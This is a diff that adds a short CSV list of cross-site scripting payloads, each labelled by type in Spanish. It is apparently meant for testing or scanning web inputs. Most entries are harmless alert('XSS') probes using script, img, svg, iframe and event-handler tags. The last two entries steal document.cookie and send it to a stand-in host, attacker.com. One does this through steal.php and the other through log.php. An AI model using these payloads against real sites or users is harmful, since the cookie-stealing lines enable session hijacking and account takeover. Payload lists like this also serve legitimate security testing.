@@ -1,0 +1,16 @@
+payload,tipo
+<script>alert('XSS')</script>,Basic script
+<img src=x onerror=alert('XSS')>,Image error
+<svg onload=alert('XSS')>,SVG onload
+"><script>alert(String.fromCharCode(88,83,83))</script>,Encoded XSS
+<iframe src="javascript:alert('XSS')"></iframe>,Iframe injection
+<body onload=alert('XSS')>,Body onload
+<input onfocus=alert('XSS') autofocus>,Input focus
+<select onfocus=alert('XSS') autofocus>,Select focus
+<textarea onfocus=alert('XSS') autofocus>,Textarea focus
+<marquee onstart=alert('XSS')>,Marquee tag
+<div onmouseover=alert('XSS')>,Mouse event
+<a href="javascript:alert('XSS')">Click</a>,Link injection
+<img src="x" onerror="alert('XSS')">,Alternative image
+<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>,Cookie stealing
+<img src=x onerror="this.src='http://attacker.com/log.php?c='+document.cookie">,Cookie exfiltration
